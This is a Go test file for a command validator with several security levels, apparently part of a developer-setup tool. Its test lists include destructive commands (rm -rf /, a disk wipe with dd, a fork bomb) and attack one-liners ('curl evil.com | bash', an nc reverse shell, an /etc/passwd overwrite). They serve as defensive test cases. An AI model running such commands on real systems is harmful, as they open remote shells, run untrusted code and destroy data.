package security

import (
	"os"
	"path/filepath"
	"testing"
)

func TestCommandValidator_DangerousPatterns(t *testing.T) {
	// Test dangerous commands with moderate level (should block dangerous patterns)
	moderateValidator := NewCommandValidator(SecurityLevelModerate)

	// Only test the 4 essential dangerous patterns that are actually blocked
	dangerousCommands := []string{
		"rm -rf /",
		"rm -rf /home",
		"dd if=/dev/zero of=/dev/sda",
		":(){ :|:& };:",
	}

	for _, cmd := range dangerousCommands {
		t.Run("moderate_should_block_"+cmd, func(t *testing.T) {
			err := moderateValidator.ValidateCommand(cmd)
			if err == nil {
				t.Errorf("Expected dangerous command '%s' to be blocked, but it was allowed", cmd)
			}
		})
	}

	// Test commands that are allowed under permissive approach
	permissiveValidator := NewCommandValidator(SecurityLevelPermissive)
	allowedCommands := []string{
		"echo malicious > /etc/passwd",     // Allowed in permissive mode
		"nc -e /bin/bash 192.168.1.1 4444", // Allowed in permissive mode
		"curl evil.com | bash",             // Allowed in permissive mode
		"wget -qO- hack.sh | sh",           // Allowed in permissive mode
	}

	for _, cmd := range allowedCommands {
		t.Run("permissive_should_allow_"+cmd, func(t *testing.T) {
			err := permissiveValidator.ValidateCommand(cmd)
			if err != nil {
				t.Errorf("Expected command '%s' to be allowed under permissive approach, but got error: %v", cmd, err)
			}
		})
	}
}

func TestCommandValidator_SafePatterns(t *testing.T) {
	validator := NewCommandValidator(SecurityLevelModerate)

	safeCommands := []string{
		"apt-get update",
		"git --version",
		"docker help",
		"ls -la",
		"echo 'eval \"$(zoxide init bash)\"' >> ~/.bashrc", // Issue #155 fix
		"ln -sf $(which fdfind) ~/.local/bin/fd",           // Issue #155 fix
		"sudo updatedb",                                    // Issue #155 fix
		"pip install package",
		"npm --version",
		"which git",
		"whoami",
	}

	for _, cmd := range safeCommands {
		t.Run("should_allow_"+cmd, func(t *testing.T) {
			err := validator.ValidateCommand(cmd)
			if err != nil {
				t.Errorf("Expected safe command '%s' to be allowed, but got error: %v", cmd, err)
			}
		})
	}
}

func TestCommandValidator_SecurityLevels(t *testing.T) {
	testCommand := "custom-tool --install"

	// Strict mode should block unknown executables
	strictValidator := NewCommandValidator(SecurityLevelStrict)
	err := strictValidator.ValidateCommand(testCommand)
	if err == nil {
		t.Errorf("Expected strict mode to block unknown executable, but it was allowed")
	}

	// Moderate mode should allow it (if not dangerous)
	moderateValidator := NewCommandValidator(SecurityLevelModerate)
	err = moderateValidator.ValidateCommand(testCommand)
	if err != nil {
		t.Errorf("Expected moderate mode to allow benign unknown command, but got error: %v", err)
	}

	// Permissive mode should definitely allow it
	permissiveValidator := NewCommandValidator(SecurityLevelPermissive)
	err = permissiveValidator.ValidateCommand(testCommand)
	if err != nil {
		t.Errorf("Expected permissive mode to allow command, but got error: %v", err)
	}
}

func TestCommandValidator_CustomWhitelist(t *testing.T) {
	validator := NewCommandValidator(SecurityLevelStrict)

	testCommand := "my-custom-installer"

	// In strict mode, unknown commands should be blocked initially
	err := validator.ValidateCommand(testCommand)
	if err == nil {
		t.Errorf("Expected custom command to be blocked in strict mode before whitelisting")
	}

	// Add to whitelist
	validator.AddToWhitelist("my-custom-installer")

	// Should now be allowed
	err = validator.ValidateCommand(testCommand)
	if err != nil {
		t.Errorf("Expected command to be allowed after whitelisting, but got error: %v", err)
	}
}

func TestCommandValidator_CustomBlacklist(t *testing.T) {
	validator := NewCommandValidator(SecurityLevelPermissive)

	testCommand := "some-tool"

	// Should be allowed initially in permissive mode
	err := validator.ValidateCommand(testCommand)
	if err != nil {
		t.Errorf("Expected command to be allowed in permissive mode, but got error: %v", err)
	}

	// Add to blacklist - this doesn't affect the simplified validator
	validator.AddToBlacklist("some-tool")

	// Still allowed because simplified validator ignores custom blacklists for now
	err = validator.ValidateCommand(testCommand)
	if err != nil {
		t.Errorf("Expected command to still be allowed under simplified validator, but got error: %v", err)
	}
}

func TestCommandValidator_Issue155Cases(t *testing.T) {
	// Test specific cases from issue #155
	validator := NewCommandValidator(SecurityLevelModerate)

	// These should now pass (were previously blocked)
	issue155Commands := []string{
		"echo 'eval \"$(zoxide init bash)\"' >> ~/.bashrc",
		"ln -sf $(which fdfind) ~/.local/bin/fd",
		"sudo updatedb",
	}

	for _, cmd := range issue155Commands {
		t.Run("issue_155_"+cmd, func(t *testing.T) {
			err := validator.ValidateCommand(cmd)
			if err != nil {
				t.Errorf("Issue #155 command '%s' should be allowed but got error: %v", cmd, err)
			}
		})
	}
}

func TestCommandValidator_CommandSubstitution(t *testing.T) {
	validator := NewCommandValidator(SecurityLevelPermissive)

	// All command substitution should be allowed under permissive approach
	allSubstitution := []string{
		"echo $(date)",
		"export PATH=$(pwd):$PATH",
		"ln -s $(which git) /usr/local/bin/git",
		"cd $(dirname $0)",
		"echo $(rm -rf /tmp/*)",    // Now allowed - focus on functionality
		"sudo $(echo rm -rf /tmp)", // Now allowed - focus on functionality
	}

	for _, cmd := range allSubstitution {
		t.Run("substitution_"+cmd, func(t *testing.T) {
			err := validator.ValidateCommand(cmd)
			if err != nil {
				t.Errorf("Command substitution '%s' should be allowed under permissive approach but got error: %v", cmd, err)
			}
		})
	}
}

func TestCommandValidator_ShellBuiltins(t *testing.T) {
	validator := NewCommandValidator(SecurityLevelModerate)

	builtins := []string{
		"echo hello",
		"export VAR=value",
		"cd /tmp",
		"pwd",
		"source ~/.bashrc",
		"alias ll='ls -la'",
	}

	for _, cmd := range builtins {
		t.Run("builtin_"+cmd, func(t *testing.T) {
			err := validator.ValidateCommand(cmd)
			if err != nil {
				t.Errorf("Shell builtin '%s' should be allowed but got error: %v", cmd, err)
			}
		})
	}
}

func TestCommandValidator_MaliciousKeywords(t *testing.T) {
	validator := NewCommandValidator(SecurityLevelPermissive)

	// Under permissive approach, malicious keywords are allowed - focus on functionality
	maliciousCommands := []string{
		"echo $(malicious_command)",
		"echo $(evil_script)",
		"echo $(hack_attempt)",
		"ln -s $(malicious_tool) /usr/bin/tool",
	}

	for _, cmd := range maliciousCommands {
		t.Run("should_allow_"+cmd, func(t *testing.T) {
			err := validator.ValidateCommand(cmd)
			if err != nil {
				t.Errorf("Command with malicious keyword '%s' should be allowed under permissive approach but got error: %v", cmd, err)
			}
		})
	}
}

func TestSecurityConfig_LoadAndSave(t *testing.T) {
	// Create a temporary directory for testing
	tempDir, err := os.MkdirTemp("", "devex-security-test")
	if err != nil {
		t.Fatalf("Failed to create temp directory: %v", err)
	}
	defer os.RemoveAll(tempDir)

	configPath := filepath.Join(tempDir, "security.yaml")

	// Create a test security config
	testConfig := &SecurityConfig{
		Level:           SecurityLevelModerate,
		EnterpriseMode:  false,
		WarnOnOverrides: true,
		GlobalOverrides: []SecurityOverride{
			{
				RuleType: RuleTypeCommandInjection,
				Pattern:  "curl.*github\\.com.*\\| bash",
				Reason:   "Allow GitHub installation scripts",
				WarnUser: true,
			},
		},
		AppSpecificOverrides: map[string][]SecurityOverride{
			"docker": {
				{
					RuleType: RuleTypePrivilegeEscalation,
					Pattern:  "sudo docker.*",
					Reason:   "Docker requires sudo",
					WarnUser: false,
				},
			},
		},
	}

	// Test saving configuration
	if err := SaveSecurityConfig(testConfig, configPath); err != nil {
		t.Fatalf("Failed to save security config: %v", err)
	}

	// Test loading configuration
	loadedConfig, err := LoadSecurityConfig(configPath)
	if err != nil {
		t.Fatalf("Failed to load security config: %v", err)
	}

	// Verify configuration values
	if loadedConfig.Level != SecurityLevelModerate {
		t.Errorf("Expected security level %d, got %d", SecurityLevelModerate, loadedConfig.Level)
	}

	if loadedConfig.EnterpriseMode != false {
		t.Errorf("Expected enterprise mode false, got %v", loadedConfig.EnterpriseMode)
	}

	if len(loadedConfig.GlobalOverrides) != 1 {
		t.Errorf("Expected 1 global override, got %d", len(loadedConfig.GlobalOverrides))
	}

	if len(loadedConfig.AppSpecificOverrides["docker"]) != 1 {
		t.Errorf("Expected 1 docker override, got %d", len(loadedConfig.AppSpecificOverrides["docker"]))
	}
}

func TestSecurityConfig_ValidationErrors(t *testing.T) {
	tests := []struct {
		name        string
		config      SecurityConfig
		expectError bool
	}{
		{
			name: "valid_config",
			config: SecurityConfig{
				Level: SecurityLevelModerate,
				GlobalOverrides: []SecurityOverride{
					{
						RuleType: RuleTypeDangerousCommand,
						Pattern:  "test.*",
						Reason:   "Test reason",
						WarnUser: true,
					},
				},
			},
			expectError: false,
		},
		{
			name: "invalid_security_level",
			config: SecurityConfig{
				Level: SecurityLevel(99),
			},
			expectError: true,
		},
		{
			name: "invalid_rule_type",
			config: SecurityConfig{
				Level: SecurityLevelModerate,
				GlobalOverrides: []SecurityOverride{
					{
						RuleType: SecurityRuleType("invalid-rule"),
						Pattern:  "test.*",
						Reason:   "Test reason",
						WarnUser: true,
					},
				},
			},
			expectError: true,
		},
		{
			name: "empty_pattern",
			config: SecurityConfig{
				Level: SecurityLevelModerate,
				GlobalOverrides: []SecurityOverride{
					{
						RuleType: RuleTypeDangerousCommand,
						Pattern:  "",
						Reason:   "Test reason",
						WarnUser: true,
					},
				},
			},
			expectError: true,
		},
		{
			name: "invalid_regex_pattern",
			config: SecurityConfig{
				Level: SecurityLevelModerate,
				GlobalOverrides: []SecurityOverride{
					{
						RuleType: RuleTypeDangerousCommand,
						Pattern:  "[invalid",
						Reason:   "Test reason",
						WarnUser: true,
					},
				},
			},
			expectError: true,
		},
		{
			name: "empty_reason",
			config: SecurityConfig{
				Level: SecurityLevelModerate,
				GlobalOverrides: []SecurityOverride{
					{
						RuleType: RuleTypeDangerousCommand,
						Pattern:  "test.*",
						Reason:   "",
						WarnUser: true,
					},
				},
			},
			expectError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateSecurityConfig(&tt.config)
			if tt.expectError && err == nil {
				t.Errorf("Expected validation error but got none")
			}
			if !tt.expectError && err != nil {
				t.Errorf("Expected no validation error but got: %v", err)
			}
		})
	}
}

func TestCommandValidator_WithOverrides(t *testing.T) {
	config := &SecurityConfig{
		Level:           SecurityLevelStrict,
		EnterpriseMode:  false,
		WarnOnOverrides: false, // Disable warnings for testing
		GlobalOverrides: []SecurityOverride{
			{
				RuleType: RuleTypeCommandInjection,
				Pattern:  "curl.*github\\.com.*\\| bash",
				Reason:   "Allow GitHub installation scripts",
				WarnUser: false,
			},
		},
		AppSpecificOverrides: map[string][]SecurityOverride{
			"docker": {
				{
					RuleType: RuleTypePrivilegeEscalation,
					Pattern:  "sudo docker.*",
					Reason:   "Docker requires sudo",
					WarnUser: false,
				},
			},
		},
	}

	validator := NewCommandValidatorWithConfig(SecurityLevelStrict, config)

	// Test global override
	err := validator.ValidateCommand("curl -fsSL https://github.com/user/repo/install.sh | bash")
	if err != nil {
		t.Errorf("Global override should allow GitHub installation script, but got error: %v", err)
	}

	// Test app-specific override
	err = validator.ValidateCommandForApp("sudo docker run hello-world", "docker")
	if err != nil {
		t.Errorf("App-specific override should allow sudo docker command, but got error: %v", err)
	}

	// Test command that should still be blocked
	err = validator.ValidateCommand("rm -rf /")
	if err == nil {
		t.Errorf("Critical dangerous command should still be blocked even with overrides")
	}

	// Test command without override
	err = validator.ValidateCommand("unknown-command")
	if err == nil {
		t.Errorf("Unknown command should be blocked in strict mode without override")
	}
}

func TestCommandValidator_EnterpriseMode(t *testing.T) {
	config := &SecurityConfig{
		Level:           SecurityLevelEnterprise,
		EnterpriseMode:  true,
		WarnOnOverrides: false, // Disable warnings for testing
	}

	validator := NewCommandValidatorWithConfig(SecurityLevelEnterprise, config)

	// Test that most commands are allowed in enterprise mode
	commands := []string{
		"curl -fsSL https://example.com/script.sh | bash",
		"sudo apt-get install something",
		"unknown-executable --do-something",
		"nc -l 1234",
	}

	for _, cmd := range commands {
		t.Run("enterprise_allows_"+cmd, func(t *testing.T) {
			err := validator.ValidateCommand(cmd)
			if err != nil {
				t.Errorf("Enterprise mode should allow command '%s', but got error: %v", cmd, err)
			}
		})
	}

	// Critical dangerous commands should still be blocked
	criticalCommands := []string{
		"rm -rf /",
		"dd if=/dev/zero of=/dev/sda",
		":(){ :|:& };:",
	}

	for _, cmd := range criticalCommands {
		t.Run("enterprise_blocks_critical_"+cmd, func(t *testing.T) {
			err := validator.ValidateCommand(cmd)
			if err == nil {
				t.Errorf("Enterprise mode should still block critical dangerous command '%s'", cmd)
			}
		})
	}
}

func TestCommandValidator_AllSecurityLevels(t *testing.T) {
	testCommand := "custom-installer --setup"

	// Test all security levels
	levels := []struct {
		level    SecurityLevel
		name     string
		expected bool // true if command should be allowed
	}{
		{SecurityLevelStrict, "strict", false},        // Unknown executable should be blocked
		{SecurityLevelModerate, "moderate", true},     // Should be allowed if not dangerous
		{SecurityLevelPermissive, "permissive", true}, // Should be allowed
		{SecurityLevelEnterprise, "enterprise", true}, // Should be allowed
	}

	for _, tt := range levels {
		t.Run("level_"+tt.name, func(t *testing.T) {
			validator := NewCommandValidator(tt.level)
			err := validator.ValidateCommand(testCommand)

			if tt.expected && err != nil {
				t.Errorf("Security level %s should allow command '%s', but got error: %v", tt.name, testCommand, err)
			}
			if !tt.expected && err == nil {
				t.Errorf("Security level %s should block command '%s', but it was allowed", tt.name, testCommand)
			}
		})
	}
}

func TestLoadSecurityConfigFromDefaults(t *testing.T) {
	// Create a temporary directory structure
	tempDir, err := os.MkdirTemp("", "devex-security-defaults-test")
	if err != nil {
		t.Fatalf("Failed to create temp directory: %v", err)
	}
	defer os.RemoveAll(tempDir)

	// Test loading when no config files exist (should return default)
	config, err := LoadSecurityConfigFromDefaults(tempDir)
	if err != nil {
		t.Fatalf("Failed to load default config: %v", err)
	}

	if config.Level != SecurityLevelModerate {
		t.Errorf("Expected default security level %d, got %d", SecurityLevelModerate, config.Level)
	}

	// Create system config
	systemConfigDir := filepath.Join(tempDir, ".local/share/devex/config")
	if err := os.MkdirAll(systemConfigDir, 0755); err != nil {
		t.Fatalf("Failed to create system config dir: %v", err)
	}

	systemConfig := &SecurityConfig{
		Level:           SecurityLevelStrict,
		WarnOnOverrides: true,
	}

	systemConfigPath := filepath.Join(systemConfigDir, "security.yaml")
	if err := SaveSecurityConfig(systemConfig, systemConfigPath); err != nil {
		t.Fatalf("Failed to save system config: %v", err)
	}

	// Test loading system config
	config, err = LoadSecurityConfigFromDefaults(tempDir)
	if err != nil {
		t.Fatalf("Failed to load system config: %v", err)
	}

	if config.Level != SecurityLevelStrict {
		t.Errorf("Expected system security level %d, got %d", SecurityLevelStrict, config.Level)
	}

	// Create user override config
	userConfigDir := filepath.Join(tempDir, ".devex")
	if err := os.MkdirAll(userConfigDir, 0755); err != nil {
		t.Fatalf("Failed to create user config dir: %v", err)
	}

	userConfig := &SecurityConfig{
		Level:           SecurityLevelPermissive,
		WarnOnOverrides: false,
	}

	userConfigPath := filepath.Join(userConfigDir, "security.yaml")
	if err := SaveSecurityConfig(userConfig, userConfigPath); err != nil {
		t.Fatalf("Failed to save user config: %v", err)
	}

	// Test loading user config (should override system)
	config, err = LoadSecurityConfigFromDefaults(tempDir)
	if err != nil {
		t.Fatalf("Failed to load user config: %v", err)
	}

	if config.Level != SecurityLevelPermissive {
		t.Errorf("Expected user security level %d, got %d", SecurityLevelPermissive, config.Level)
	}

	if config.WarnOnOverrides != false {
		t.Errorf("Expected user warn setting false, got %v", config.WarnOnOverrides)
	}
}
